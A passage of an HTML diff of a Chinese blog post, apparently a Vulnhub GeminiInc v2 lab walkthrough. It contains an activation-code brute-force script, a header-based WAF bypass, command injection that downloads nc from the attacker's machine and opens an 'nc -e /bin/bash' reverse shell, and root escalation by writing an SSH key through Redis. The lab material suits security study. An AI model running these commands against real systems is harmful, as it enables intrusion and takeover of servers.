class="built_in">echo</span> <span class="string">&quot;Key = &quot;</span><span class="variable">$key</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
-<p>修改靶机的ip，然后执行，等待一段时间后 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~]</span><br><span class="line">└─<span class="comment"># ./geminiinc2.sh                                                                                   </span></span><br><span class="line">Key = 000511</span><br></pre></td></tr></table></figure></p>
+<p>在网上找到别人写的一个脚本： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token assign-left variable">url</span><span class="token operator">=</span><span class="token string">"http://192.168.100.21/activate.php"</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">key</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span>000000<span class="token punctuation">..</span><span class="token number">999999</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token assign-left variable">token</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -c cookie $url <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">'value='</span> <span class="token string">'/token/ &#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">"'"</span> -f2<span class="token variable">)</span></span>
+    <span class="token assign-left variable">resp</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -w %<span class="token punctuation">&#123;</span>http_code<span class="token punctuation">&#125;</span> -b cookie --data <span class="token string">"userid=14&amp;activation_code=<span class="token variable">$key</span>&amp;token=<span class="token variable">$&#123;token&#125;</span>"</span> $url <span class="token operator">|</span> <span class="token function">tail</span> -n <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">">"</span> -f2<span class="token variable">)</span></span>
+    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$resp</span> -ne <span class="token number">403</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"Key = "</span><span class="token variable">$key</span>
+        <span class="token builtin class-name">break</span>
+    <span class="token keyword">fi</span>
+<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>修改靶机的ip，然后执行，等待一段时间后 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀hdfzzf<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># ./geminiinc2.sh                                                                                   </span>
+Key <span class="token operator">=</span> 000511<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <p>此时将得到的code提交即可激活。</p>
 <h3 id="方法2">2.2.2. 方法2</h3>
 <p>利用burp爆破，不过有点麻烦，需要设置许多东西。</p>
@@ -424,7 +305,7 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png" /></p>
 <p>其中命令执行让我打起了精神，但是直接访问是空白，我们抓包看一下发生了什么事</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png" /></p>
-<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1 </span><br></pre></td></tr></table></figure></p>
+<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入 <pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 127.0.0.1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>也可以加入其他头部。因为每个包都需要加这个，直接使用burp设置一下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png" /></p>
 <p>然后勾选上就可以了，这样子每个包burp就会自动添加上该头部。当然也可以用burp的插件，Bypass WAF，原理一样，自行搜索。</p>
@@ -436,149 +317,261 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png" /></p>
 <p>那么可以直接通过这里执行nc，反弹shell即可。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png" /></p>
-<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">1. <span class="built_in">cd</span> /usr/bin</span><br><span class="line">2. python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="comment"># 将nc保存到/tmp下面</span></span><br></pre></td></tr></table></figure></p>
-<p>然后执行： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod%09%2bx%09/tmp/nc</span><br><span class="line">/tmp/nc%09192.168.100.10%094444%09-e%09/bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kali:
+<span class="token number">1</span>. <span class="token builtin class-name">cd</span> /usr/bin
+<span class="token number">2</span>. python3 -m http.server <span class="token number">80</span>
+
+靶机：
+<span class="token number">1</span>. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="token comment"># 将nc保存到/tmp下面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>然后执行： <pre class="line-numbers language-none"><code class="language-none">chmod%09%2bx%09&#x2F;tmp&#x2F;nc
+&#x2F;tmp&#x2F;nc%09192.168.100.10%094444%09-e%09&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p>注意：</p>
 <ol type="1">
 <li>chmod +x /tmp/nc的时候，如果直接在输入框输入，只需要修改空格为%09即可。因为自动会把+ url编码；如果在burp输入，需要把 + url编码，因为在burp中+就是空格；</li>
 </ol>
 <p>成功得到shell。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">gemini1@geminiinc:/var/www/html$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span>
+gemini1@geminiinc:/var/www/html$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gemini1<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gemini1<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gemini1<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="番外">2.3.1. 番外</h3>
 <p>其实除了使用%09代替空格之外，还可以使用IFS，[[远程命令、代码执行总结（PHP）]]</p>
-<p>在传完nc之后，执行： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFS=:;val=/tmp/nc:192.168.100.10:4444:-e:/bin/bash;<span class="variable">$val</span></span><br></pre></td></tr></table></figure></p>
+<p>在传完nc之后，执行： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span>:<span class="token punctuation">;</span><span class="token assign-left variable">val</span><span class="token operator">=</span>/tmp/nc:192.168.100.10:4444:-e:/bin/bash<span class="token punctuation">;</span><span class="token variable">$val</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>也可以反弹shell。IFS=:的作用是将:全都转为空格。</p>
 <h2 id="权限提升">2.4. 权限提升</h2>
 <p>经过信息收集，发现没有suid、内核等常用的提权，但是在查看端口的时候发现开了6379端口，这是redis使用的端口，而redis又存在着许多漏洞。除此之外，还开起了3306，这是MySQL默认的端口。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png" /></p>
 <p>这里需要注意现在获得的shell是不能够进行交互的，如果直接连接redis就会出不来，因此下面需要利用ssh登录获得完整的shell。但是我们不知道密码该怎么办呢？其实很简单，通过对端口服务的发现，可以猜测ssh可能可以ssh公钥认证登录。</p>
-<p>先在kali上生成公私钥 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure></p>
-<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">1. mkdir .ssh</span><br><span class="line">2. <span class="built_in">cd</span> .ssh</span><br><span class="line">3. /tmp/nc -lvnp 4444 &gt; authorized_keys</span><br><span class="line"></span><br><span class="line">kalil:</span><br><span class="line">1. nc 192.168.100.21 4444 &lt; id_rsa.pub -w 1</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. chmod 600 authorized_keys</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">1. ssh gemini1@192.168.100.21 -i id_rsa</span><br></pre></td></tr></table></figure></p>
+<p>先在kali上生成公私钥 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶机：
+<span class="token number">1</span>. <span class="token function">mkdir</span> .ssh
+<span class="token number">2</span>. <span class="token builtin class-name">cd</span> .ssh
+<span class="token number">3</span>. /tmp/nc -lvnp <span class="token number">4444</span> <span class="token operator">></span> authorized_keys
+
+kalil:
+<span class="token number">1</span>. <span class="token function">nc</span> <span class="token number">192.168</span>.100.21 <span class="token number">4444</span> <span class="token operator">&lt;</span> id_rsa.pub -w <span class="token number">1</span>
+
+靶机：
+<span class="token number">1</span>. <span class="token function">chmod</span> <span class="token number">600</span> authorized_keys
+
+kali:
+<span class="token number">1</span>. <span class="token function">ssh</span> gemini1@192.168.100.21 -i id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png" /></p>
 <p>我对redis的漏洞不熟，这里演示一下该漏洞的利用。</p>
-<p>首先查看redis的配置文件，默认在/etc/redis <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redis/6379.conf</span><br></pre></td></tr></table></figure></p>
+<p>首先查看redis的配置文件，默认在/etc/redis <pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;redis&#x2F;6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>内容非常的多，要仔细看，发现了下面这段话</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png" /></p>
 <p>有一个requirepass: 8a7b86a2cd89d96dfcc125ebcc0535e6。接下来就一步一步操作。</p>
 <ol type="1">
-<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat authorized_keys; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; pub.txt</span><br></pre></td></tr></table></figure></p></li>
-<li><p>将pub.txt的内容传入redis，作为一个键 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pub.txt | redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span class="built_in">set</span> ssh_key <span class="comment"># 键名可以随意</span></span><br></pre></td></tr></table></figure></p></li>
-<li><p>连接到redis，并且进行相关配置 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 <span class="comment"># 登录redis</span></span><br><span class="line">2. config <span class="built_in">set</span> dir /root/.ssh <span class="comment"># 设置默认数据库目录为/root/.ssh</span></span><br><span class="line">3. config <span class="built_in">set</span> dbfilename authorized_keys <span class="comment"># 设置默认数据库名为authorized_keys</span></span><br><span class="line">4. save <span class="comment"># 导出</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> authorized_keys<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> pub.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p></li>
+<li><p>将pub.txt的内容传入redis，作为一个键 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> pub.txt <span class="token operator">|</span> redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span class="token builtin class-name">set</span> ssh_key <span class="token comment"># 键名可以随意</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p></li>
+<li><p>连接到redis，并且进行相关配置 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 <span class="token comment"># 登录redis</span>
+<span class="token number">2</span>. config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh <span class="token comment"># 设置默认数据库目录为/root/.ssh</span>
+<span class="token number">3</span>. config <span class="token builtin class-name">set</span> dbfilename authorized_keys <span class="token comment"># 设置默认数据库名为authorized_keys</span>
+<span class="token number">4</span>. save <span class="token comment"># 导出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p></li>
 </ol>
-<p>然后利用ssh登录root即可，密钥不变。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@192.168.100.21</span></span><br><span class="line">Linux geminiinc 4.9.0-5-amd64 <span class="comment">#1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May  3 10:49:01 2022 from ::1</span><br><span class="line">root@geminiinc:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
-<p>最后读取flag： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line"> ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">    _________                                     __        .__          __  .__                     ._.    </span><br><span class="line">    \_   ___ \  ____   ____    ________________ _/  |_ __ __|  | _____ _/  |_|__| ____   ____   _____| |    </span><br><span class="line">    /    \  \/ /  _ \ /    \  / ___\_  __ \__  \\   __\  |  \  | \__  \\   __\  |/  _ \ /    \ /  ___/ |    </span><br><span class="line">    \     \___(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  | |  |  /  |__/ __ \|  | |  (  &lt;_&gt; )   |  \\___ \ \|    </span><br><span class="line">     \______  /\____/|___|  /\___  /|__|  (____  /__| |____/|____(____  /__| |__|\____/|___|  /____  &gt;__    </span><br><span class="line">            \/            \//_____/            \/                     \/                    \/     \/ \/    </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">Did you had fun? :)</span><br><span class="line">https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">Tweet me your writeup!</span><br><span class="line">https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______</span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/</span><br></pre></td></tr></table></figure></p>
+<p>然后利用ssh登录root即可，密钥不变。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀hdfzzf<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/.ssh<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh -i id_rsa root@192.168.100.21</span>
+Linux geminiinc <span class="token number">4.9</span>.0-5-amd64 <span class="token comment">#1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May  <span class="token number">3</span> <span class="token number">10</span>:49:01 <span class="token number">2022</span> from ::1
+root@geminiinc:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后读取flag： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// /root/flag.txt
+
+ ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ 
+ /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ 
+                                                                                                            
+                                                                                                            
+    _________                                     __        .__          __  .__                     ._.    
+    <span class="token punctuation">\</span>_   ___ <span class="token punctuation">\</span>  ____   ____    ________________ _/  <span class="token operator">|</span>_ __ __<span class="token operator">|</span>  <span class="token operator">|</span> _____ _/  <span class="token operator">|</span>_<span class="token operator">|</span>__<span class="token operator">|</span> ____   ____   _____<span class="token operator">|</span> <span class="token operator">|</span>    
+    /    <span class="token punctuation">\</span>  <span class="token punctuation">\</span>/ /  _ <span class="token punctuation">\</span> /    <span class="token punctuation">\</span>  / ___<span class="token punctuation">\</span>_  __ <span class="token punctuation">\</span>__  <span class="token punctuation">\</span><span class="token punctuation">\</span>   __<span class="token punctuation">\</span>  <span class="token operator">|</span>  <span class="token punctuation">\</span>  <span class="token operator">|</span> <span class="token punctuation">\</span>__  <span class="token punctuation">\</span><span class="token punctuation">\</span>   __<span class="token punctuation">\</span>  <span class="token operator">|</span>/  _ <span class="token punctuation">\</span> /    <span class="token punctuation">\</span> /  ___/ <span class="token operator">|</span>    
+    <span class="token punctuation">\</span>     <span class="token punctuation">\</span>___<span class="token punctuation">(</span>  <span class="token operator">&lt;</span>_<span class="token operator">></span> <span class="token punctuation">)</span>   <span class="token operator">|</span>  <span class="token punctuation">\</span>/ /_/  <span class="token operator">></span>  <span class="token operator">|</span> <span class="token punctuation">\</span>// __ <span class="token punctuation">\</span><span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>  /  <span class="token operator">|</span>__/ __ <span class="token punctuation">\</span><span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">(</span>  <span class="token operator">&lt;</span>_<span class="token operator">></span> <span class="token punctuation">)</span>   <span class="token operator">|</span>  <span class="token punctuation">\</span><span class="token punctuation">\</span>___ <span class="token punctuation">\</span> <span class="token punctuation">\</span><span class="token operator">|</span>    
+     <span class="token punctuation">\</span>______  /<span class="token punctuation">\</span>____/<span class="token operator">|</span>___<span class="token operator">|</span>  /<span class="token punctuation">\</span>___  /<span class="token operator">|</span>__<span class="token operator">|</span>  <span class="token punctuation">(</span>____  /__<span class="token operator">|</span> <span class="token operator">|</span>____/<span class="token operator">|</span>____<span class="token punctuation">(</span>____  /__<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span><span class="token punctuation">\</span>____/<span class="token operator">|</span>___<span class="token operator">|</span>  /____  <span class="token operator">></span>__    
+            <span class="token punctuation">\</span>/            <span class="token punctuation">\</span>//_____/            <span class="token punctuation">\</span>/                     <span class="token punctuation">\</span>/                    <span class="token punctuation">\</span>/     <span class="token punctuation">\</span>/ <span class="token punctuation">\</span>/    
+                                                                                                            
+                                                                                                            
+  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ 
+ /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ 
+                                                                                                            
+                                                                                                            
+Did you had fun? <span class="token builtin class-name">:</span><span class="token punctuation">)</span>
+https://scriptkidd1e.wordpress.com
+
+Tweet me your writeup<span class="token operator">!</span>
+https://twitter.com/sec_9emin1
+
+  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______
+ /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <h1 id="总结">3. 总结</h1>
 <p>该靶机怎么说呢，对我来说难度很高，因为我对redis不是很熟悉，并且在爆破code的时候也耽误了很久。</p>
 <p>不过通过对该靶机的渗透让我觉得，只要是第三方服务，都有可能存在漏洞，尤其关注配置文件。</p>
 <p>还有一点，路径扫描多用不同工具扫！！！</p>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
-              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
-              <a href="/tags/WAF-Bypass/" rel="tag"># WAF Bypass</a>
-              <a href="/tags/Anto-CSRF-token/" rel="tag"># Anto CSRF token</a>
-              <a href="/tags/%E9%9A%90%E8%97%8F%E8%B7%AF%E5%BE%84%E7%88%AC%E5%8F%96/" rel="tag"># 隐藏路径爬取</a>
-              <a href="/tags/redis%E6%BC%8F%E6%B4%9E/" rel="tag"># redis漏洞</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/05/03/Linux(kali)%E5%AE%89%E8%A3%85clash/" rel="prev" title="Linux(kali)安装clash">
-                  <i class="fa fa-chevron-left"></i> Linux(kali)安装clash
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/" rel="next" title="22 Vulnhub Tomato Writeup">
-                  22 Vulnhub Tomato Writeup <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span 